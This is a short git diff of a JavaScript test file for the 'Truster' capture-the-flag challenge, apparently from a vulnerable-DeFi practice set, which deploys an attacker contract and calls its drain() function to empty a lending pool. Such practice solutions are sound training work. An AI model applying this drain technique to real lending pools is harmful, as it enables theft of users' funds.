@@ -23,14 +23,14 @@ describe('[Challenge] Truster', function () {
 		expect(await this.token.balanceOf(attacker.address)).to.equal('0')
 	})
 
-	/** CODE YOUR EXPLOIT HERE  */
 	it('Exploit', async function () {
-		// Deploy
+		/** CODE YOUR EXPLOIT HERE  */
+		// Deploy attacker contract
 		const TrusterAttack = await ethers.getContractFactory('TrusterAttack', attacker)
-		attackContract = await TrusterAttack.deploy(this.token.address, this.pool.address)
+		this.attackContract = await TrusterAttack.deploy(this.token.address, this.pool.address)
 
-		// Drain
-		attackContract.connect(attacker).drain()
+		// Call the drain() function
+		await this.attackContract.connect(attacker).drain()
 	})
 
 	after(async function () {
